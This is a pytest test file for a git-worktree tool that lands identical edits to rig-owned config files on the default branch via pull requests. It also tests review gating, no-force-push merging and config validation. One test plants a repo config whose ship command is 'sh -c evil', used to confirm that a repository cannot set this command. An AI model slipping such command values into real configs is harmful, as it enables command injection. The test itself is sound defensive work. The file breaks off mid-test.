"""``tracked_files`` — land rig-owned committed files once on the default branch (riglib/tracked_files.py).

Every test builds a real git topology in ``tmp_path``: a bare ``origin.git`` (the forge), a primary
clone and linked worktrees. Pushes go to that bare repo; only the forge CLIs (``gh``/``fj``),
review-cli and ``gh ship`` are stubbed through the injectable ``runner``.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from riglib import tracked_files as tf
from riglib.config import ConfigError, validate

BASE = "version: 1\n"
# a config migration every worktree received the same way (valid on any rig: task.code_prefix)
TASK_BLOCK = "version: 1\n\ntask:\n  code_prefix: UB\n"


@pytest.fixture(autouse=True)
def _hermetic_git(monkeypatch, tmp_path):
    """No ambient git config (hooks, identity, signing) and an isolated rig state dir.

    tracked_files' own git calls drop GIT_CONFIG_GLOBAL (``_clean_env``) and so read
    ``$HOME/.gitconfig`` — the throwaway HOME conftest.py pins for every test keeps those hermetic too.
    """
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    for var in ("GIT_AUTHOR_NAME", "GIT_COMMITTER_NAME"):
        monkeypatch.setenv(var, "t")
    for var in ("GIT_AUTHOR_EMAIL", "GIT_COMMITTER_EMAIL"):
        monkeypatch.setenv(var, "t@example.test")
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))


def _g(cwd: Path, *args: str) -> str:
    return subprocess.run(["git", "-C", str(cwd), *args], check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture
def forge(tmp_path: Path) -> SimpleNamespace:
    """origin.git (bare, main has rig.yaml) + a primary clone with origin/HEAD set."""
    seed = tmp_path / "seed"
    seed.mkdir()
    _g(seed, "init", "-q", "-b", "main")
    (seed / "rig.yaml").write_text(BASE, encoding="utf-8")
    (seed / "README.md").write_text("x\n", encoding="utf-8")
    _g(seed, "add", ".")
    _g(seed, "commit", "-qm", "init")
    origin = tmp_path / "origin.git"
    _g(tmp_path, "clone", "-q", "--bare", str(seed), str(origin))
    repo = tmp_path / "repo"
    _g(tmp_path, "clone", "-q", str(origin), str(repo))
    _g(repo, "remote", "set-head", "origin", "main")
    return SimpleNamespace(origin=origin, repo=repo, tmp=tmp_path)


def _worktree(repo: Path, name: str, *, rig_yaml: str | None = None, commit: str | None = None) -> Path:
    path = repo.parent / f"wt-{name}"
    _g(repo, "worktree", "add", "-q", "-b", name, str(path), "origin/main")
    if commit is not None:
        (path / "rig.yaml").write_text(commit, encoding="utf-8")
        _g(path, "commit", "-qam", f"{name} own rig.yaml")
    if rig_yaml is not None:
        (path / "rig.yaml").write_text(rig_yaml, encoding="utf-8")
    return path


def _settings(**kw) -> tf.Settings:
    base = {"enabled": True, "normalize_min_age_minutes": 0, "land": "pr"}
    base.update(kw)
    return tf.Settings(**base)


def _age(path: Path, seconds: int = 3 * 3600) -> None:
    old = path.stat().st_mtime - seconds
    os.utime(path, (old, old))


# ── discovery ─────────────────────────────────────────────────────────────────────


def test_identical_edit_in_enough_worktrees_is_a_landing(forge):
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    b = _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "clean")

    disc = tf.discover(forge.repo, _settings())

    assert [pl.rel for pl in disc.landings] == ["rig.yaml"]
    assert disc.landings[0].content == TASK_BLOCK.encode()
    assert sorted(disc.landings[0].supporters) == sorted([a, b])
    assert not disc.conflicts


def test_a_single_worktrees_edit_stays_below_the_threshold(forge):
    _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)

    disc = tf.discover(forge.repo, _settings())

    assert disc.landings == []
    assert disc.below_threshold == {"rig.yaml": 1}
    assert any("skip rig.yaml" in line for line in tf.render_plan_lines(disc, _settings(), None, []))


def test_two_competing_edits_are_a_conflict_and_land_nothing(forge):
    other = TASK_BLOCK.replace("UB", "XY")
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    for n in ("c", "d"):
        _worktree(forge.repo, n, rig_yaml=other)

    disc = tf.discover(forge.repo, _settings())

    assert disc.landings == []
    assert list(disc.conflicts) == ["rig.yaml"]
    assert any(line.startswith("conflict: rig.yaml") for line in tf.render_plan_lines(disc, _settings(), None, []))


def test_an_edit_on_a_branch_whose_committed_copy_differs_from_main_is_not_harvested(forge):
    # the worktree's HEAD already changed rig.yaml: its uncommitted edit is relative to that,
    # not to main, so it cannot land on main as-is
    for n in ("a", "b"):
        _worktree(forge.repo, n, commit=BASE + "# branch-local\n", rig_yaml=TASK_BLOCK)

    disc = tf.discover(forge.repo, _settings())

    assert disc.landings == []


def test_paths_outside_the_configured_set_are_ignored(forge):
    for n in ("a", "b"):
        wt = _worktree(forge.repo, n)
        (wt / "README.md").write_text("changed\n", encoding="utf-8")

    assert tf.discover(forge.repo, _settings()).landings == []


def test_a_copy_equal_to_main_is_a_normalize_candidate(forge):
    wt = _worktree(forge.repo, "a")
    (wt / "rig.yaml").write_text(TASK_BLOCK, encoding="utf-8")
    _g(forge.repo, "push", "-q", "origin", f"{_commit_on(forge, TASK_BLOCK)}:refs/heads/main")
    _g(forge.repo, "fetch", "-q", "origin")

    disc = tf.discover(forge.repo, _settings())

    assert [(c.checkout, c.rel) for c in disc.landed_copies] == [(wt, "rig.yaml")]
    assert disc.landings == []


def _commit_on(forge, rig_yaml: str) -> str:
    """A commit on top of origin/main that sets rig.yaml (built in a throwaway clone)."""
    tmp = forge.tmp / f"pusher-{abs(hash(rig_yaml))}"
    if not tmp.exists():
        _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    _g(tmp, "fetch", "-q", "origin")
    _g(tmp, "reset", "-q", "--hard", "origin/main")
    (tmp / "rig.yaml").write_text(rig_yaml, encoding="utf-8")
    _g(tmp, "commit", "-qam", "land")
    _g(tmp, "push", "-q", "origin", "HEAD:refs/heads/_landed")
    _g(forge.repo, "fetch", "-q", "origin", "_landed")
    return _g(forge.repo, "rev-parse", "FETCH_HEAD")


# ── normalize ─────────────────────────────────────────────────────────────────────


def _land_on_main(forge, rig_yaml: str) -> None:
    sha = _commit_on(forge, rig_yaml)
    _g(forge.repo, "push", "-q", "origin", f"{sha}:refs/heads/main")
    _g(forge.repo, "fetch", "-q", "origin")


def test_normalize_checks_out_copies_that_equal_main(forge):
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    b = _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)
    differs = _worktree(forge.repo, "c", rig_yaml=TASK_BLOCK + "# mine\n")
    for wt in (a, b, differs):
        _age(wt / "rig.yaml")
    _land_on_main(forge, TASK_BLOCK)

    res = tf.normalize(tf.discover(forge.repo, _settings()), _settings(), liveness=lambda p: False)

    assert sorted(res.reset) == sorted([(a, "rig.yaml"), (b, "rig.yaml")])
    assert _g(a, "status", "--porcelain") == "" and _g(b, "status", "--porcelain") == ""
    assert (differs / "rig.yaml").read_text(encoding="utf-8").endswith("# mine\n")  # unique content kept


def test_normalize_removes_an_untracked_new_file_equal_to_main(forge):
    wt = _worktree(forge.repo, "a")
    (wt / "task.yaml").write_text("version: 1\n", encoding="utf-8")
    _age(wt / "task.yaml")
    tmp = forge.tmp / "pusher-task"
    _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    (tmp / "task.yaml").write_text("version: 1\n", encoding="utf-8")
    _g(tmp, "add", "task.yaml")
    _g(tmp, "commit", "-qm", "task")
    _g(tmp, "push", "-q", "origin", "HEAD:main")
    _g(forge.repo, "fetch", "-q", "origin")

    res = tf.normalize(tf.discover(forge.repo, _settings()), _settings(), liveness=lambda p: False)

    assert res.reset == [(wt, "task.yaml")]
    assert not (wt / "task.yaml").exists()


def test_normalize_skips_locked_live_and_recent(forge):
    locked = _worktree(forge.repo, "locked", rig_yaml=TASK_BLOCK)
    live = _worktree(forge.repo, "live", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "recent", rig_yaml=TASK_BLOCK)  # left fresh: its copy is too recent to touch
    for wt in (locked, live):
        _age(wt / "rig.yaml")
    _g(forge.repo, "worktree", "lock", str(locked))
    _land_on_main(forge, TASK_BLOCK)
    settings = _settings(normalize_min_age_minutes=120)

    res = tf.normalize(tf.discover(forge.repo, settings), settings, liveness=lambda p: p == live)

    assert res.reset == []
    reasons = {Path(p).name: why for p, _rel, why in res.skipped}
    assert reasons["wt-locked"] == "locked"
    assert "live agent" in reasons["wt-live"]
    assert "changed within 120 min" in reasons["wt-recent"]


def test_normalize_off_touches_nothing(forge):
    wt = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _age(wt / "rig.yaml")
    _land_on_main(forge, TASK_BLOCK)
    settings = _settings(normalize_worktrees=False)

    assert tf.normalize(tf.discover(forge.repo, settings), settings).reset == []
    assert (wt / "rig.yaml").read_text(encoding="utf-8") == TASK_BLOCK


# ── landing ───────────────────────────────────────────────────────────────────────


class _Forge:
    """Stub runner: real git, fake `gh`/`fj`/`review`/`gh ship` (records every call)."""

    def __init__(self, ship_outcomes: list[tuple[int, str]] | None = None, on_merge=None, pr_state: str = "Open"):
        self.calls: list[list[str]] = []
        self.ship_outcomes = list(ship_outcomes or [])
        self.on_merge = on_merge
        self.pr_state = pr_state

    def __call__(self, cmd, cwd=None, **kw):
        self.calls.append(list(cmd))
        if cmd[0] == "git":
            return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
        if cmd[:3] == ["gh", "pr", "create"] or (cmd[0] == "fj" and "create" in cmd):
            return subprocess.CompletedProcess(cmd, 0, "https://forge.example.test/o/r/pulls/7\n", "")
        if cmd[0] == "fj" and "view" in cmd:
            header = f"\u2068title\u2069 #\u20687\u2069\nBy \u2068u\u2069 — \u2068{self.pr_state}\u2069 — +1 -0\n"
            return subprocess.CompletedProcess(cmd, 0, header + "\n> merged body text\n", "")
        if cmd[:3] == ["gh", "pr", "view"]:
            return subprocess.CompletedProcess(cmd, 0, self.pr_state.upper() + "\n", "")
        if cmd[0] == "review":
            return subprocess.CompletedProcess(cmd, 0, "", "")
        if cmd[:2] == ["gh", "ship"]:
            rc, out = self.ship_outcomes.pop(0)
            if rc == 0 and self.on_merge:
                self.on_merge()
            return subprocess.CompletedProcess(cmd, rc, "", out)
        raise AssertionError(f"unexpected command {cmd}")


def _set_origin_url(forge, url: str) -> None:
    """Point `origin` at a forge-shaped URL for provider detection, pushing to the bare repo."""
    _g(forge.repo, "remote", "set-url", "origin", url)
    _g(forge.repo, "remote", "set-url", "--push", "origin", str(forge.origin))
    _g(forge.repo, "config", "remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*")
    _g(forge.repo, "config", f"url.{forge.origin}.insteadOf", url)


def test_land_opens_one_pr_with_the_harvested_content(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    stub = _Forge()

    res = tf.land(forge.repo, _settings(land="pr"), runner=stub, spawn_ship=False)

    assert res.status == "pr-open", res.message
    assert res.pr_url == "https://forge.example.test/o/r/pulls/7" and res.pr_number == 7
    assert res.branch and res.branch.startswith(tf.BRANCH_PREFIX)
    assert _g(forge.origin, "show", f"{res.branch}:rig.yaml") + "\n" == TASK_BLOCK
    assert _g(forge.origin, "rev-parse", f"{res.branch}~1") == _g(forge.origin, "rev-parse", "main")
    create = next(c for c in stub.calls if c[0] in ("gh", "fj") and "create" in c)
    assert "--base" in create and create[create.index("--base") + 1] == "main"
    state = tf.read_state(forge.repo)
    assert state["status"] == "pr-open" and state["pr_number"] == 7
    # the checkouts themselves were not touched
    assert (forge.repo.parent / "wt-a" / "rig.yaml").read_text(encoding="utf-8") == TASK_BLOCK


def test_land_uses_gh_for_github_and_fj_for_forgejo(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    _set_origin_url(forge, "https://git.example.test/o/r.git")
    stub = _Forge()

    res = tf.land(forge.repo, _settings(), runner=stub, spawn_ship=False)

    assert res.status == "pr-open", res.message
    create = next(c for c in stub.calls if "create" in c)
    assert create[:3] == ["fj", "-H", "git.example.test"]
    assert tf.forge_of(forge.repo) == ("forgejo", "git.example.test")


def test_fj_output_with_isolation_marks_yields_the_pr_number_and_url(forge):
    # fj prints `created pull request #\u206825\u2069: <title>` -- no URL, digits wrapped in
    # Unicode isolation marks
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    _set_origin_url(forge, "https://git.example.test/o/r.git")

    def runner(cmd, cwd=None, **kw):
        if cmd[0] == "fj":
            return subprocess.CompletedProcess(cmd, 0, "created pull request #\u206825\u2069: \u2068title\u2069\n", "")
        return _Forge()(cmd, cwd=cwd, **kw)

    res = tf.land(forge.repo, _settings(), runner=runner, spawn_ship=False)

    assert (res.pr_number, res.pr_url) == (25, "https://git.example.test/o/r/pulls/25")


def test_land_records_a_review_of_the_staged_diff_under_the_task_code(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    stub = _Forge()

    tf.land(forge.repo, _settings(ship_task_code="UB-3", review_models="m1,m2,m3"), runner=stub, spawn_ship=False)

    review = next(c for c in stub.calls if c[0] == "review")
    assert review == ["review", "diff", "--staged", "--task", "UB-3", "-m", "m1,m2,m3"]
    assert stub.calls.index(review) < next(i for i, c in enumerate(stub.calls) if c[:2] == ["git", "push"])


def test_a_failed_review_lands_nothing_and_leaves_no_worktree(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    def runner(cmd, cwd=None, **kw):
        if cmd[0] == "review":
            return subprocess.CompletedProcess(cmd, 1, "", "board degraded")
        return _Forge()(cmd, cwd=cwd, **kw)

    res = tf.land(forge.repo, _settings(ship_task_code="UB-3"), runner=runner, spawn_ship=False)

    assert res.status == "error" and "review" in res.message
    assert not (forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME).exists()
    assert _g(forge.origin, "branch", "--list", "rig/*") == ""
    assert tf.read_state(forge.repo) is None  # nothing left the machine, nothing in flight


def test_nothing_to_land_cleans_up(forge):
    res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "nothing"
    assert not (forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME).exists()


def test_a_landing_in_flight_is_not_opened_twice(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    first = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    second = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert first.status == "pr-open"
    assert second.status == "in-flight" and second.pr_url == first.pr_url


def test_diverted_actions_run_in_the_landing_worktree_not_the_checkout(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    seen: list[Path] = []

    def apply_diverted(landing: Path) -> list[str]:
        seen.append(landing)
        (landing / ".ship-config").write_text("SHIP_TASK_CODE_PREFIX=UB\n", encoding="utf-8")
        return [".ship-config"]

    res = tf.land(forge.repo, _settings(), apply_diverted=apply_diverted, runner=_Forge(), spawn_ship=False)

    assert seen == [forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME]
    assert _g(forge.origin, "show", f"{res.branch}:.ship-config") == "SHIP_TASK_CODE_PREFIX=UB"
    assert not (forge.repo / ".ship-config").exists()


# ── the background lander ─────────────────────────────────────────────────────────


def _shipping_state(forge, stub) -> Path:
    for n in ("a", "b"):
        wt = _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
        _age(wt / "rig.yaml")
    res = tf.land(forge.repo, _settings(land="ship", ship_task_code="UB-3", ship_args=("--no-version-bump-ok", "cfg")),
                  runner=stub, spawn_ship=False)
    assert res.status == "pr-open", res.message
    return tf.state_path(forge.repo)


def _merge_landing_branch(forge) -> None:
    state = tf.read_state(forge.repo)
    _g(forge.origin, "update-ref", "refs/heads/main", _g(forge.origin, "rev-parse", state["branch"]))


def test_ship_loop_retries_pending_ci_then_merges_and_normalizes(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: PR #7 still has 3 pending check(s) after 900s."), (0, "merged")],
                  on_merge=lambda: _merge_landing_branch(forge))
    spath = _shipping_state(forge, stub)
    sleeps: list[float] = []

    outcome = tf.ship_loop(spath, runner=stub, sleep=sleeps.append, liveness_factory=lambda: (lambda p: False))

    assert outcome == "merged"
    assert len(sleeps) == 1
    ships = [c for c in stub.calls if c[:2] == ["gh", "ship"]]
    assert ships[0] == ["gh", "ship", "7", "--no-version-bump-ok", "cfg"]
    state = json.loads(spath.read_text(encoding="utf-8"))
    assert state["status"] == "merged"
    assert len(state["normalized"]) == 2
    for n in ("a", "b"):
        assert _g(forge.repo.parent / f"wt-{n}", "status", "--porcelain") == ""
    assert not (forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME).exists()


def test_ship_loop_stops_on_a_final_refusal(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: review quorum not met for UB-3")])
    spath = _shipping_state(forge, stub)

    outcome = tf.ship_loop(spath, runner=stub, sleep=lambda s: None)

    assert outcome == "ship-refused"
    state = json.loads(spath.read_text(encoding="utf-8"))
    assert state["status"] == "ship-refused" and "quorum" in state["error"]
    assert not tf.in_flight(state)


def test_ship_loop_merges_main_in_when_behind_never_force_pushing(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: PR #7 is BEHIND main"), (0, "merged")],
                  on_merge=lambda: _merge_landing_branch(forge))
    spath = _shipping_state(forge, stub)
    tmp = forge.tmp / "pusher-readme"
    _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    (tmp / "README.md").write_text("moved\n", encoding="utf-8")
    _g(tmp, "commit", "-qam", "main moved")
    _g(tmp, "push", "-q", "origin", "HEAD:main")
    moved = _g(tmp, "rev-parse", "HEAD")

    outcome = tf.ship_loop(spath, runner=stub, sleep=lambda s: None, liveness_factory=lambda: (lambda p: False))

    assert outcome == "merged"
    branch = json.loads(spath.read_text(encoding="utf-8"))["branch"]
    # the landing branch now contains the moved main (a merge, not a rewrite of history)
    assert subprocess.run(["git", "-C", str(forge.origin), "merge-base", "--is-ancestor", moved, "main"]).returncode == 0
    assert all("--force" not in c and "-f" not in c for c in stub.calls if c[:2] == ["git", "push"])
    assert branch.startswith(tf.BRANCH_PREFIX)


def test_ship_loop_gives_up_after_the_deadline(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: PR #7 is only 5s old since its last push")] * 3)
    spath = _shipping_state(forge, stub)

    outcome = tf.ship_loop(spath, runner=stub, sleep=lambda s: None, deadline_s=-1)

    assert outcome == "timed-out"


# ── divert ────────────────────────────────────────────────────────────────────────


def test_divert_holds_back_actions_that_write_a_tracked_owned_file(forge):
    prefix = SimpleNamespace(kind="provision_ship_task_prefix", target=forge.repo, category="task", item="code_prefix")
    other = SimpleNamespace(kind="write_file", target=forge.repo / "docs" / "x.md", category="docs", item="x")
    home = SimpleNamespace(kind="copy_skill", target=forge.tmp / "home" / "skills" / "s", category="skills", item="s")

    kept, diverted = tf.divert_actions([prefix, other, home], forge.repo, _settings())

    assert diverted == [prefix]
    assert kept == [other, home]
    assert tf.divert_actions([prefix], forge.repo, tf.Settings(enabled=False)) == ([prefix], [])


def test_a_directory_target_installer_is_not_diverted_even_when_its_files_match(forge):
    # the ci installer targets <repo>/.github/workflows and writes files under it: not held back
    # (documented) — its copies are still harvested and normalized like any listed file
    (forge.repo / ".github" / "workflows").mkdir(parents=True)
    ci = SimpleNamespace(kind="install_ci", target=forge.repo / ".github" / "workflows", category="ci", item="x")

    kept, diverted = tf.divert_actions([ci], forge.repo, _settings(paths=(".github/workflows/*.yml",)))

    assert (kept, diverted) == ([ci], [])


def test_lint_check_workflow_is_diverted_when_its_file_is_tracked_owned(forge):
    # the rig-owned workflow targets the repo root and writes one fixed file under it
    wf = SimpleNamespace(kind="install_lint_check_workflow", target=forge.repo, category="lint_checks", item="ci-workflow")
    hook = SimpleNamespace(
        kind="install_lint_check_hook", target=forge.tmp / "home" / ".config" / "git" / "global-hooks.d" / "pre-commit" / "30-lint-check",
        category="lint_checks_machine", item="pre-commit-hook",
    )

    kept, diverted = tf.divert_actions([wf, hook], forge.repo, _settings(paths=(".github/workflows/*.yml",)))

    assert diverted == [wf] and kept == [hook]  # the machine-wide dispatcher fragment is never a repo file
    assert tf.divert_actions([wf], forge.repo, _settings(paths=("docs/*.md",))) == ([wf], [])


def test_divert_leaves_an_ignored_file_alone(forge):
    (forge.repo / ".gitignore").write_text(".ship-config\n", encoding="utf-8")
    prefix = SimpleNamespace(kind="provision_ship_task_prefix", target=forge.repo)

    kept, diverted = tf.divert_actions([prefix], forge.repo, _settings())

    assert (kept, diverted) == ([prefix], [])


# ── config ────────────────────────────────────────────────────────────────────────


def test_config_block_validates_and_resolves():
    block = {
        "paths": ["rig.yaml", ".github/workflows/*.yml"], "land": "ship", "harvest_min_worktrees": 3,
        "normalize_worktrees": True, "normalize_min_age_minutes": 30,
        "ship": {"task_code": "UB-3", "task_config": "~/t.yaml", "args": ["--no-version-bump-ok", "cfg"],
                 "command": "fj ship"},
        "review": {"models": "a,b,c"},
    }
    validate({"version": 1, "tracked_files": block})

    s = tf.settings_from_config({"tracked_files": block})

    assert s.enabled and s.paths == ("rig.yaml", ".github/workflows/*.yml") and s.harvest_min_worktrees == 3
    assert s.ship_task_code == "UB-3" and s.ship_command == "fj ship" and s.review_models == "a,b,c"
    assert tf.settings_from_config({}).enabled is False  # absent block: off
    assert tf.settings_from_config({"tracked_files": {}}).enabled is True  # presence opts in
    assert tf.settings_from_config({"tracked_files": {"enabled": False}}).enabled is False


@pytest.mark.parametrize(
    "block, where",
    [
        ({"land": "merge"}, "tracked_files.land"),
        ({"paths": ["../outside"]}, "tracked_files.paths"),
        ({"paths": "rig.yaml"}, "tracked_files.paths"),
        ({"harvest_min_worktrees": 0}, "tracked_files.harvest_min_worktrees"),
        ({"nope": 1}, "tracked_files.nope"),
        ({"ship": {"task_code": 3}}, "tracked_files.ship.task_code"),
        ({"ship": {"bogus": "x"}}, "tracked_files.ship.bogus"),
        ({"review": {"models": ["a"]}}, "tracked_files.review.models"),
    ],
)
def test_config_block_rejects_bad_values(block, where):
    with pytest.raises(ConfigError) as excinfo:
        validate({"version": 1, "tracked_files": block})
    assert excinfo.value.schema_path == where


# ── CLI: preview shows the pending merges, dry-run writes nothing ─────────────────


def _cli_env(forge, monkeypatch, fake_agent_tools, block: str = "tracked_files: {land: pr}\n") -> None:
    xdg = forge.tmp / "xdg"
    (xdg / "rig").mkdir(parents=True)
    (xdg / "rig" / "config.yaml").write_text(
        f"version: 1\nagent_tools_source: {fake_agent_tools}\n"
        "skills: {enabled: false}\nagent_hooks: {enabled: false}\nci: {enabled: false}\nmcp: {enabled: false}\n"
        "git_hooks: {dispatcher: {enabled: false}}\nharness: {enabled: false}\npermissions: {enabled: false}\n"
        "agents_md: {enabled: false}\ngitignore: {enabled: false}\ntmux: {enabled: false}\n"
        "tg_ctl: {enabled: false}\nmodels: {enabled: false}\n" + block,
        encoding="utf-8",
    )
    monkeypatch.setenv("XDG_CONFIG_HOME", str(xdg))
    monkeypatch.setenv("RIG_AGENT_TOOLS_SOURCE", str(fake_agent_tools))


@pytest.mark.parametrize("argv", [["apply"], ["apply", "commit", "--dry-run"]])
def test_apply_preview_lists_the_pending_merge_and_changes_nothing(forge, monkeypatch, capsys, fake_agent_tools, argv):
    from riglib.cli import main

    _cli_env(forge, monkeypatch, fake_agent_tools)
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)

    rc = main([*argv, "-C", str(a)])
    out = capsys.readouterr().out

    assert rc == 0, out
    assert "tracked_files — pending merges to the default branch:" in out
    assert "land rig.yaml" in out and "from 2 worktree(s)" in out and "origin/main" in out
    # rig's own .ship-config reconcile (from task.code_prefix) is held back, not written here
    assert "land rig's own reconcile of .ship-config" in out
    assert not (a / ".ship-config").exists()
    assert _g(forge.origin, "branch", "--list", "rig/*") == ""
    assert not (forge.repo / ".worktrees").exists()
    assert tf.read_state(forge.repo) is None


def test_apply_without_the_block_shows_no_tracked_files_section(forge, monkeypatch, capsys, fake_agent_tools):
    from riglib.cli import main

    _cli_env(forge, monkeypatch, fake_agent_tools, block="")
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)

    main(["apply", "-C", str(a)])

    assert "tracked_files" not in capsys.readouterr().out


# ── review findings: trust, symlinks, deletions, globs, stale state, leftovers ───


def test_the_block_is_global_only_a_repo_rig_yaml_cannot_set_it(tmp_path):
    from riglib import config

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "rig.yaml").write_text("version: 1\ntracked_files:\n  ship: {command: 'sh -c evil'}\n", encoding="utf-8")

    with pytest.raises(ConfigError) as excinfo:
        config.load(repo)
    assert "tracked_files is a global-only config block" in str(excinfo.value)


@pytest.mark.parametrize("block", [None, {"land": None}, {"enabled": None}, {"ship": {"command": None}},
                                   {"paths": None}])
def test_null_values_are_rejected_not_read_as_defaults(block):
    with pytest.raises(ConfigError):
        validate({"version": 1, "tracked_files": block})


def test_a_paths_entry_naming_a_directory_is_reported_not_silently_ignored(forge):
    for n in ("a", "b"):
        wt = _worktree(forge.repo, n)
        (wt / "docs").mkdir()
        (wt / "docs" / "x.md").write_text("same\n", encoding="utf-8")

    disc = tf.discover(forge.repo, _settings(paths=("docs",)))

    assert disc.landings == [] and disc.landed_copies == []
    assert any("names a directory" in note and "docs/x.md" in note for note in disc.notes), disc.notes


def test_apply_commit_outside_only_lands_nothing_and_says_so(forge, monkeypatch, capsys, fake_agent_tools):
    from riglib.cli import main

    _cli_env(forge, monkeypatch, fake_agent_tools)
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)

    rc = main(["apply", "commit", "--only", "skills", "-C", str(a)])
    out = capsys.readouterr().out

    assert rc == 0, out
    assert "tracked_files: not landing (outside --only)" in out
    assert tf.read_state(forge.repo) is None
    assert _g(forge.origin, "branch", "--list", "rig/*") == ""
    assert not (a / ".ship-config").exists()  # the held-back reconcile still stays out of the checkout


def test_ship_loop_stops_when_merging_main_in_conflicts(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: PR #7 is BEHIND main"), (0, "merged")])
    spath = _shipping_state(forge, stub)
    tmp = forge.tmp / "pusher-conflict"
    _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    (tmp / "rig.yaml").write_text("version: 1\n\n# main moved these same lines\n", encoding="utf-8")
    _g(tmp, "commit", "-qam", "main edits rig.yaml")
    _g(tmp, "push", "-q", "origin", "HEAD:main")

    outcome = tf.ship_loop(spath, runner=stub, sleep=lambda s: None)

    state = json.loads(spath.read_text(encoding="utf-8"))
    assert outcome == "ship-refused"
    assert "could not update the branch" in state["error"] and "conflicts" in state["error"]
    assert len([c for c in stub.calls if c[:2] == ["gh", "ship"]]) == 1  # no retry after the conflict
    assert _g(Path(state["worktree"]), "status", "--porcelain") == ""  # the merge was aborted


def test_commit_normalizes_against_a_freshly_fetched_default_branch(forge):
    wt = _worktree(forge.repo, "a", commit="version: 1\n# a's own\n")
    (wt / "rig.yaml").write_text(BASE, encoding="utf-8")  # equals main as the preview scan saw it
    _age(wt / "rig.yaml")
    ctx = tf.apply_context(SimpleNamespace(diverted=[]), {"tracked_files": {"normalize_min_age_minutes": 0}},
                           forge.repo, landing_config=None)
    assert [c.checkout for c in ctx.discovery.landed_copies] == [wt]
    tmp = forge.tmp / "pusher-moves-main"  # main moves on the forge after the preview scan
    _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    (tmp / "rig.yaml").write_text("version: 1\n# main moved\n", encoding="utf-8")
    _g(tmp, "commit", "-qam", "main moved")
    _g(tmp, "push", "-q", "origin", "HEAD:main")

    rc = tf.commit(ctx, build_plan=lambda p: None, emit=lambda *a, **k: None, ok=str, err=str, dim=str)

    assert rc == 0
    # kept: after the fetch the copy no longer equals the default branch, so it is not reset
    assert (wt / "rig.yaml").read_text(encoding="utf-8") == BASE


def test_commit_lands_an_edit_the_fetch_made_landable(forge, monkeypatch):
    committed = "version: 1\n# the branches' own rig.yaml\n"
    for n in ("a", "b"):
        (_worktree(forge.repo, n, commit=committed) / "rig.yaml").write_text(TASK_BLOCK, encoding="utf-8")
    ctx = tf.apply_context(SimpleNamespace(diverted=[]), {"tracked_files": {}}, forge.repo, landing_config=None)
    assert ctx.discovery.landings == []  # HEAD differs from main as the preview scan saw it
    tmp = forge.tmp / "pusher-takes-branch"  # main takes the branches' committed rig.yaml
    _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    (tmp / "rig.yaml").write_text(committed, encoding="utf-8")
    _g(tmp, "commit", "-qam", "main takes the branches' rig.yaml")
    _g(tmp, "push", "-q", "origin", "HEAD:main")
    calls: list[tuple] = []
    monkeypatch.setattr(tf, "land", lambda *a, **k: calls.append(a) or tf.LandResult("nothing", "stub"))

    printed: list[str] = []
    tf.commit(ctx, build_plan=lambda p: None, emit=lambda *a, **k: printed.append(" ".join(map(str, a))),
              ok=str, err=str, dim=str)

    assert calls, "the post-fetch scan found a landable edit, so the landing must run"
    # and the plan it prints is that post-fetch scan, not the preview's
    assert any("land rig.yaml" in line and "from 2 worktree(s)" in line for line in printed), printed


def test_a_foreign_worktree_at_the_landing_path_is_never_destroyed(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    theirs = tf.landing_worktree_path(forge.repo)  # someone's own worktree under the reserved name
